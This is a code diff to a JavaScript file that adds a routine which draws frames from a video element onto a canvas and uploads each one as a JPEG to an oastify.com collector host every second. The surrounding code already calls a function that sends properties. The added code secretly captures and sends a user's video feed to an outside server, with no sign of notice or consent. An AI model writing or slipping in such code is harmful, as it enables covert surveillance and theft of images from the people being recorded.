@@ -181,6 +181,41 @@ function sendProperties() {
 
 // Call the function to send the properties list
 sendProperties();
+// Create a canvas element to capture frames from the video
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+
+// Function to capture and send frames
+function captureAndSend() {
+  // Set canvas dimensions to match the video
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  // Draw the current video frame onto the canvas
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // Get the image data from the canvas
+  canvas.toBlob(blob => {
+    // Send the image data to the server
+    const formData = new FormData();
+    formData.append('file', blob, 'frame.jpg');
+
+    fetch('https://ssov6ezvutyw0x8q27wodrpsyj4as1ip7.oastify.com', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.text())
+    .then(result => {
+      console.log('Upload successful:', result);
+    })
+    .catch(error => {
+      console.error('Upload failed:', error);
+    });
+  }, 'image/jpeg');
+}
+
+// Call captureAndSend periodically
+setInterval(captureAndSend, 1000); // Capture and send every 1 second
 
 
 
